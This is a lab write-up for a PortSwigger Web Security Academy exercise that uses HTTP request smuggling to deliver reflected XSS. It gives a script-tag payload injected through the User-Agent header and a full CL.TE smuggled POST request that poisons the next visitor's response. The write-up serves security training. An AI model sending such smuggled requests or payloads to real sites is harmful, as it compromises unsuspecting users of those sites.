# Exploiting HTTP request smuggling to deliver reflected XSS

## Description

[This lab](https://portswigger.net/web-security/request-smuggling/exploiting/lab-deliver-reflected-xss) involves a front-end and back-end server, and the front-end server doesn't support chunked encoding. The application is also vulnerable to reflected XSS via the User-Agent header.

## Reproduction and proof of concept

1. Visit a blog post, and send the request to Burp Repeater.
2. Observe that the comment form contains your ``User-Agent`` header in a hidden input.
3. Inject an XSS payload into the ``User-Agent`` header and observe that it gets reflected:

```text
"/><script>alert(1)</script>
```

4. Smuggle this XSS request to the back-end server, so that it exploits the next visitor:

```text
POST / HTTP/1.1
Host: lab-id.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 150
Transfer-Encoding: chunked

0

GET /post?postId=5 HTTP/1.1
User-Agent: a"/><script>alert(1)</script>
Content-Type: application/x-www-form-urlencoded
Content-Length: 5

x=1
```

## Exploitability

An attacker will need to smuggle a request to the back-end server that causes the next user's request to receive a response containing an XSS exploit that executes `alert(1)`.
